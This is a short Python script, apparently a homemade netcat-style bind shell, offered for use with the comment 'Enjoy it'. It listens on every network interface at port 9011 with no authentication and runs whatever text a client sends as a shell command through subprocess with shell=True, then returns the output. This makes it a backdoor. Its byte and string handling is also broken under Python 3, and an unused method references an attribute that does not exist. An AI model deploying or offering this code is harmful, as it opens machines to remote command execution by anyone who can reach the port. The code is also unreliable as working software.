# Filename: ncshell.py
# -*- coding:utf-8 -*-  


import threading
import socket
import os
import subprocess

encoding = 'utf-8'
BUFSIZE = 1024


# a read thread, read data from remote
class Reader(threading.Thread):
    def __init__(self, client):
        threading.Thread.__init__(self)
        self.client = client
        
    def run(self):
        while True:
                        data = self.client.recv(BUFSIZE)
                        if(data):
                                print (data,type(data))
                                a = str(data)
                                b = a.replace("\r\n","")
                                print(b,type(b))
                                temp = subprocess.Popen(b,shell = True,stdout=subprocess.PIPE)
                                output = temp.stdout.readlines()
                                if output is None:  
                                        output = []    
                                for one_line in output:  
                                        self.client.sendall(one_line)  
                                        #self.client.sendall("\n")    
                                self.client.sendall("###############cmmand ok\n")  
                        else:
                                break
        print("close:", self.client.getpeername())
        
    def readline(self):
        rec = self.inputs.readline()
        if rec:
            string = bytes.decode(rec, encoding)
            if len(string)>2:
                string = string[0:-2]
            else:
                string = ' '
        else:
            string = False
        return string


# a listen thread, listen remote connect
# when a remote machine request to connect, it will create a read thread to handle
class Listener(threading.Thread):
    def __init__(self, port):
        threading.Thread.__init__(self)
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(0)
    def run(self):
        print("listener started",self.port)
        while True:
            client, cltadd = self.sock.accept()
            Reader(client).start()
            cltadd = cltadd
            print("accept a connect",client,cltadd)


lst  = Listener(9011)   # create a listen thread
lst.start() # then start


# Now, you can use telnet to test it, the command is "telnet 127.0.0.1 9011"
# You also can use web broswer to test, input the address of "http://127.0.0.1:9011" and press Enter button
# Enjoy it....
